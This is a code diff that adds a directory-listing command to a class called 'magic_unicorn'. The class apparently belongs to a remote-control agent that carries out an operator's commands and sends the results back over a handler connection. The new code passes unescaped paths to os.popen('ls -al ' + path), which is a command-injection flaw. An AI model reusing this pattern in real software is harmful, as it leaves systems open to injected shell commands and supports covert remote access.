@@ -180,6 +180,79 @@ class magic_unicorn:
         browser.open(cmd_data)
         self.handler.send("".encode("UTF-8"))
 
+    def command_lsdir(self, cmd_data):
+        if cmd_data[-1] != "/":
+            cmd_data = cmd_data + "/"
+        if os.path.isdir(cmd_data):
+            names = []
+            names.append(".")
+            names.append("..")
+            for i in sorted(os.listdir(cmd_data)):
+                names.append(i)
+            directory_contents = ""
+            directory_contents += "\n"
+            directory_contents += "Listing: " + cmd_data[:-1] + "\n"
+            directory_contents += "=" * len("Listing: " + cmd_data[:-1]) + "\n"
+            directory_contents += "\n"
+            owners = []
+            groups = []
+            sizes = []
+            dates = []
+            modes = []
+            for i in names:
+                owners.append(pwd.getpwuid(os.stat(cmd_data + i).st_uid)[0])
+                groups.append(grp.getgrgid(os.stat(cmd_data + i).st_gid)[0])
+                sizes.append(str(os.stat(cmd_data + i).st_size))
+                dates.append(time.ctime(os.path.getmtime(cmd_data + i)))
+                if os.path.isdir(cmd_data + i):
+                    modes.append(os.popen("ls -al " + cmd_data + i).read().split(" ")[1].split("\n")[1])
+                else:
+                    modes.append(os.popen("ls -al " + cmd_data + i).read().split(" ")[0])
+            bigger_owner = len(owners[0])
+            bigger_group = len(groups[0])
+            bigger_size = len(sizes[0])
+            bigger_date = len(dates[0])
+            bigger_mode = len(modes[0])
+            for i in range(0, len(names)):
+                if len(owners[i]) > bigger_owner:
+                    bigger_owner = len(owners[i])
+                if len(groups[i]) > bigger_group:
+                    bigger_group = len(groups[i])
+                if len(sizes[i]) > bigger_size:
+                    bigger_size = len(sizes[i])
+                if len(dates[i]) > bigger_date:
+                    bigger_date = len(dates[i])
+                if len(modes[i]) > bigger_mode:
+                    bigger_mode = len(modes[i])
+            if bigger_owner >= 6:
+                bigger_owner_len = bigger_owner - 3
+            else:
+                bigger_owner_len = 2
+            if bigger_group >= 6:
+                bigger_group_len = bigger_group - 3
+            else:
+                bigger_group_len = 2
+            if bigger_size >= 5:
+                bigger_size_len = bigger_size - 2
+            else:
+                bigger_size_len = 2
+            if bigger_date >= 14:
+                bigger_date_len = bigger_date - 11
+            else:
+                bigger_date_len = 2
+            if bigger_mode >= 6:
+                bigger_mode_len = bigger_mode - 3
+            else:
+                bigger_mode_len = 2
+            directory_contents += "Modes"+" "*(bigger_mode_len)+"Owner"+" "*(bigger_owner_len)+"Group"+" "*(bigger_group_len)+"Size"+" "*(bigger_size_len)+"Last Modified"+" "*(bigger_date_len)+"Name\n"
+            directory_contents += "-----"+" "*(bigger_mode_len)+"-----"+" "*(bigger_owner_len)+"-----"+" "*(bigger_group_len)+"----"+" "*(bigger_size_len)+"-------------"+" "*(bigger_date_len)+"----\n"
+            for i in range(0, len(names)):
+                directory_contents += modes[i] + " " * (5 - len(modes[i]) + bigger_mode_len) + owners[i] + " " * (5 - len(owners[i]) + bigger_owner_len) + groups[i] + " " * (5 - len(groups[i]) + bigger_group_len) + sizes[i] + " " * (4 - len(sizes[i]) + bigger_size_len) + dates[i] + " " * (13 - len(dates[i]) + bigger_date_len) + names[i] + "\n"
+            directory_contents += "\n"
+            self.handler.send(directory_contents.encode("UTF-8"))
+        else:
+            self.handler.send((self.badges.E + "Error: " + cmd_data[:-1] + ": not a directory!").encode("UTF-8"))
+        
     def command_chdir(self, cmd_data):
         if cmd_data == "-":
             if not self.temp_directory:
